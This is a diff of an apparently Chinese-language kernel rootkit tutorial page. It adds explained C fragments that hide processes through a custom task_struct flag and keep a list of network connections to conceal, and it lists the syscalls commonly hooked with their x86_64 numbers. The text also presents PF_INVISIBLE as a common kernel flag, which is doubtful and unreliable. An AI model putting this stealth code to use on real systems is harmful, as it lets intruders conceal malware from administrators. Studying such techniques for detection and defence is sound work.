@@ -308,6 +308,89 @@ void<span class="w"> </span>module_hide<span class="o">(</span>void<span class="
 <span class="w">    </span><span class="nv">module_hidden</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>!module_hidden<span class="p">;</span>
 <span class="o">}</span>
 </code></pre></div>
+<p>隐藏进程。设置或清除指定进程及其线程的标志位,具体功能如下</p>
+<ul>
+<li>锁定 RCU 读锁，查找并获取指定 PID 对应的任务结构。</li>
+<li>如果找到任务结构，遍历该任务及其所有线程，根据参数 set 设置或清除标志位。</li>
+</ul>
+<p>在 Linux 中，task_struct-&gt;flags 常见的标志位包括：PF_INVISIBLE：标记进程为“不可见”，通常用于隐藏进程。
+PF_EXITING：表示进程正在退出。PF_FORKNOEXEC：表示进程已 fork 但尚未 exec。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">#define FLAG 0x80000000</span>
+
+struct<span class="w"> </span>tgid_iter<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>unsigned<span class="w"> </span>int<span class="w"> </span>tgid<span class="p">;</span>
+<span class="w">    </span>struct<span class="w"> </span>task_struct<span class="w"> </span>*task<span class="p">;</span>
+<span class="o">}</span><span class="p">;</span>
+
+
+static<span class="w"> </span>inline<span class="w"> </span>int<span class="w"> </span>is_task_invisible<span class="o">(</span>struct<span class="w"> </span>task_struct<span class="w"> </span>*task<span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>task-&gt;flags<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>FLAG<span class="p">;</span>
+<span class="o">}</span>
+
+
+int<span class="w"> </span>flag_tasks<span class="o">(</span>pid_t<span class="w"> </span>pid,<span class="w"> </span>int<span class="w"> </span><span class="nb">set</span><span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span>int<span class="w"> </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
+<span class="w">    </span>struct<span class="w"> </span>pid<span class="w"> </span>*p<span class="p">;</span>
+
+<span class="w">    </span>rcu_read_lock<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span><span class="nv">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>find_get_pid<span class="o">(</span>pid<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>p<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>struct<span class="w"> </span>task_struct<span class="w"> </span>*task<span class="w"> </span><span class="o">=</span><span class="w"> </span>get_pid_task<span class="o">(</span>p,<span class="w"> </span>PIDTYPE_PID<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>task<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="c1">#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(3, 14, 0)</span>
+<span class="w">            </span>struct<span class="w"> </span>task_struct<span class="w"> </span>*t<span class="w"> </span><span class="o">=</span><span class="w"> </span>NULL<span class="p">;</span>
+
+<span class="w">            </span>for_each_thread<span class="o">(</span>task,<span class="w"> </span>t<span class="o">)</span>
+<span class="w">            </span><span class="o">{</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nb">set</span><span class="o">)</span>
+<span class="w">                    </span>t-&gt;flags<span class="w"> </span><span class="p">|</span><span class="o">=</span><span class="w"> </span>FLAG<span class="p">;</span>
+<span class="w">                </span><span class="k">else</span>
+<span class="w">                    </span>t-&gt;flags<span class="w"> </span><span class="p">&amp;</span><span class="o">=</span><span class="w"> </span>~FLAG<span class="p">;</span>
+
+<span class="w">                </span>ret++<span class="p">;</span>
+<span class="w">            </span><span class="o">}</span>
+<span class="c1">#endif</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nb">set</span><span class="o">)</span>
+<span class="w">                </span>task-&gt;flags<span class="w"> </span><span class="p">|</span><span class="o">=</span><span class="w"> </span>FLAG<span class="p">;</span>
+<span class="w">            </span><span class="k">else</span>
+<span class="w">                </span>task-&gt;flags<span class="w"> </span><span class="p">&amp;</span><span class="o">=</span><span class="w"> </span>~FLAG<span class="p">;</span>
+
+<span class="w">            </span>put_task_struct<span class="o">(</span>task<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="o">}</span>
+<span class="w">        </span>put_pid<span class="o">(</span>p<span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span>rcu_read_unlock<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>ret<span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>隐藏网络连接。具体功能如下：</p>
+<ul>
+<li>分配内存创建一个隐藏连接结构体。</li>
+<li>将传入的地址信息赋值给新创建的结构体。</li>
+<li>将新创建的结构体添加到隐藏连接列表中。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>hidden_conn<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>struct<span class="w"> </span>sockaddr_in<span class="w"> </span>addr<span class="p">;</span>
+<span class="w">    </span>struct<span class="w"> </span>list_head<span class="w"> </span>list<span class="p">;</span>
+<span class="o">}</span><span class="p">;</span>
+
+struct<span class="w"> </span>list_head<span class="w"> </span>hidden_conn_list<span class="p">;</span>
+
+void<span class="w"> </span>network_hide_add<span class="o">(</span>struct<span class="w"> </span>sockaddr_in<span class="w"> </span>addr<span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span>struct<span class="w"> </span>hidden_conn<span class="w"> </span>*hc<span class="p">;</span>
+
+<span class="w">    </span><span class="nv">hc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>kmalloc<span class="o">(</span>sizeof<span class="o">(</span>*hc<span class="o">)</span>,<span class="w"> </span>GFP_KERNEL<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!hc<span class="o">)</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+
+<span class="w">    </span>hc-&gt;addr<span class="w"> </span><span class="o">=</span><span class="w"> </span>addr<span class="p">;</span>
+<span class="w">    </span>list_add<span class="o">(</span><span class="p">&amp;</span>hc-&gt;list,<span class="w"> </span><span class="p">&amp;</span>hidden_conn_list<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
 <h5>怎么HOOK与HOOK哪些函数</h5>
 <p>在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。</p>
@@ -414,31 +497,31 @@ int<span class="w"> </span>protect_proc_init<span class="o">()</span><span class
 <p>常用被HOOK的syscall 有如下：  </p>
 <div class="highlight"><pre><span></span><code>open：打开文件。
 宏定义：__NR_open
-调用号示例（x86_64）：2
+调用号（x86_64）：2
 
 read：从文件读取数据。
 宏定义：__NR_read
-调用号示例（x86_64）：0
+调用号（x86_64）：0
 
 unlink：删除文件。
 宏定义：__NR_unlink
-调用号示例（x86_64）:<span class="w"> </span><span class="m">87</span>
+调用号（x86_64）:<span class="w"> </span><span class="m">87</span>
 
 getdents64：读取目录内容（64位版本）。
 宏定义：__NR_getdents64
-调用号示例（x86_64）:<span class="w"> </span><span class="m">78</span>
+调用号（x86_64）:<span class="w"> </span><span class="m">78</span>
 
 kill：发送信号给进程。
 宏定义：__NR_kill
-调用号示例（x86_64）：62
+调用号（x86_64）：62
 
 connect：发起连接请求。
 宏定义：__NR_connect
-调用号示例（x86_64）:<span class="w"> </span><span class="m">42</span>
+调用号（x86_64）:<span class="w"> </span><span class="m">42</span>
 
 execve：执行新程序。
 宏定义：__NR_execve
-调用号示例（x86_64）：59
+调用号（x86_64）：59
 </code></pre></div>
 <p>HOOK 的方法，跟上面大同小异， 就不在赘述。</p>
   </div>
